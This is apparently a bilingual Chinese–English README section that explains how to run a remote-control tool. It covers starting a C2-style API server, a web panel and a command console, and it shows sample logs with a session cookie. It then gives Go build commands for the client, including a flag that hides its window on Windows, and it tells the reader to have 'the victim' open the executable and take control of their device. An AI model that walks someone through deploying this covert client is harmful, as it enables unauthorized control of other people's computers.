# 运行 / Running

## 中文 / Chinese

配置完环境后，先进入`code`目录运行`server_api.py`
```bash
cd code
python server_api.py
```
运行结果参考：
```
[12/19/25 23:27:01] INFO     2025-12-19 23:27:01,837 - INFO - 版权所有：Copyright © 赵博凯, All Rights Reserved.                       server_api.py:308
                    INFO     2025-12-19 23:27:01,845 - INFO - 程序启动                                                                 server_api.py:288
                    INFO     2025-12-19 23:27:01,847 - INFO - 初始化服务器                                                             server_api.py:259
                    INFO     2025-12-19 23:27:01,849 - INFO - 证书路径：../cert.pem，密钥路径：../key.pem                              server_api.py:260
                    INFO     2025-12-19 23:27:01,859 - INFO - SSL证书加载成功                                                          server_api.py:265
                    INFO     2025-12-19 23:27:01,861 - INFO - 启动服务器：0.0.0.0:8765                                                 server_api.py:273
                    INFO     2025-12-19 23:27:01,894 - INFO - server listening on 0.0.0.0:8765                                             server.py:341
                    INFO     2025-12-19 23:27:01,897 - INFO - 服务器启动成功                                                           server_api.py:276
[2025-12-19 23:27:01 -0500] [1195589] [INFO] Running on http://0.0.0.0:5000 (CTRL + C to quit)
                    INFO     2025-12-19 23:27:01,904 - INFO - Running on http://0.0.0.0:5000 (CTRL + C to quit)                           logging.py:107
```

接着如果想要网页端就运行`server_web.py`
```bash
python server_web.py
```
运行结果参考：
```
2025-12-19 23:30:02,843 - INFO - 版权所有：Copyright © 赵博凯, All Rights Reserved.
2025-12-19 23:30:02,843 - INFO - 正在启动程序...
[2025-12-19 23:30:02 -0500] [1198971] [INFO] Running on http://0.0.0.0:8000 (CTRL + C to quit)
2025-12-19 23:30:02,844 - INFO - Running on http://0.0.0.0:8000 (CTRL + C to quit)
```
访问这里的URL输入密码即可

或是想要命令行模式：
```bash
python server.py
```
运行结果参考：
```
[23:33:27] [*] 版权所有：Copyright © 赵博凯, All Rights Reserved.                                                                           server.py:23
[23:33:27] [*] 程序启动                                                                                                                     server.py:23
[23:33:27] [*] 正在验证密码                                                                                                                 server.py:23
[23:33:27] [+] 验证成功，cookie: {'Cookie': 'e6f452c657764158a01af9db65eb2f80eb295bebe6e67fa2667a8c0d355f5c1b'}                             server.py:35
(server)>
```

最后编译`client.go`
```bash
go build -o <output_filename> client.go
```

如果想要一个在Windows系统上隐藏黑窗的客户端，可以运行：
```bash
go build -ldflags "-H windowsgui" -o <output_filename> client.go
```

让受害者打开编译后的可执行文件，如果配置正确且权限允许，你将可以随心所欲地控制他的设备

就这样开始吧！

## English / 英文

After configuring the environment, first enter the `code` directory and run `server_api.py`:
```bash
cd code
python server_api.py
```
Reference running result:
```
[12/19/25 23:27:01] INFO     2025-12-19 23:27:01,837 - INFO - Copyright: Copyright © 赵博凯, All Rights Reserved.                       server_api.py:308
                    INFO     2025-12-19 23:27:01,845 - INFO - Program startup                                                                 server_api.py:288
                    INFO     2025-12-19 23:27:01,847 - INFO - Initializing server                                                             server_api.py:259
                    INFO     2025-12-19 23:27:01,849 - INFO - Certificate path: ../cert.pem, key path: ../key.pem                              server_api.py:260
                    INFO     2025-12-19 23:27:01,859 - INFO - SSL certificate loaded successfully                                          server_api.py:265
                    INFO     2025-12-19 23:27:01,861 - INFO - Starting server: 0.0.0.0:8765                                                 server_api.py:273
                    INFO     2025-12-19 23:27:01,894 - INFO - server listening on 0.0.0.0:8765                                             server.py:341
                    INFO     2025-12-19 23:27:01,897 - INFO - Server started successfully                                                   server_api.py:276
[2025-12-19 23:27:01 -0500] [1195589] [INFO] Running on http://0.0.0.0:5000 (CTRL + C to quit)
                    INFO     2025-12-19 23:27:01,904 - INFO - Running on http://0.0.0.0:5000 (CTRL + C to quit)                           logging.py:107
```

Then if you want the web interface, run `server_web.py`:
```bash
python server_web.py
```
Reference running result:
```
2025-12-19 23:30:02,843 - INFO - Copyright: Copyright © 赵博凯, All Rights Reserved.
2025-12-19 23:30:02,843 - INFO - Starting program...
[2025-12-19 23:30:02 -0500] [1198971] [INFO] Running on http://0.0.0.0:8000 (CTRL + C to quit)
2025-12-19 23:30:02,844 - INFO - Running on http://0.0.0.0:8000 (CTRL + C to quit)
```
Visit this URL and enter the password.

Or if you prefer command-line mode:
```bash
python server.py
```
Reference running result:
```
[23:33:27] [*] Copyright: Copyright © 赵博凯, All Rights Reserved.                                                                           server.py:23
[23:33:27] [*] Program startup                                                                                                             server.py:23
[23:33:27] [*] Verifying password                                                                                                         server.py:23
[23:33:27] [+] Verification successful, cookie: {'Cookie': 'e6f452c657764158a01af9db65eb2f80eb295bebe6e67fa2667a8c0d355f5c1b'}             server.py:35
(server)>
```

Finally, compile `client.go`:
```bash
go build -o <output_filename> client.go
```

If you want a client that hides the black window in Windows, you can run:
```bash
go build -ldflags "-H windowsgui" -o <output_filename> client.go
```

Have the victim open the compiled executable file. If the configuration is correct and permissions are granted, you will be able to control their device as you wish.

That's how to get started!
